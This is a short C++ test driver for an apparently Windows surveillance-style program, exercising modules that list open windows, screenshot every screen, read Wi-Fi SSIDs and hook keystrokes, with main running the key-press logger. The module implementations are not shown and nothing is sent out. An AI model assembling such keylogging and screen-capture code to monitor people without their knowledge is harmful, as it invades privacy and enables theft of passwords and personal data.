#include <ostream>

#include "windows_apps_info_manager.hpp"
#include "screenshots_manager.hpp"
#include "network_manager.hpp"
#include "key_presses_manager.hpp"

void get_windows_apps_info_TEST() {
    auto windows_manager = WindowsAppsInfoManager();
    for (const auto& window : windows_manager.get_windows_info()) {
        std::wcout << window << std::endl;
    }
}

void take_screenshots_TEST() {
    ScreenshotsManager screenshots_manager(L"./");
    auto screenshots_filepaths = screenshots_manager.take_screenshots_of_all_screens();
}

void get_ssids_TEST() {
    NetworkManager network_manager;
    std::vector<std::string> SSIDs = network_manager.get_current_SSIDs();

    std::cout << "prining ssids: " << std::endl;
    for (auto&& curr_ssid : SSIDs) {
        std::cout << "- " << curr_ssid << std::endl;
    }
}

void start_key_presses_logging_TEST() {
    auto key_presses_manager = KeyPressesManager::create_manager_instance(std::cout);

    key_presses_manager->start();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        // The purpose of this loop is to retrieve messages from the application's message 
        // queue and dispatch them to the appropriate window procedure for handling
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    key_presses_manager->end();
}

int main() {
    //get_windows_apps_info_TEST();
    //take_screenshots_TEST();
    //get_ssids_TEST();

    start_key_presses_logging_TEST();
    
    return 0;
}
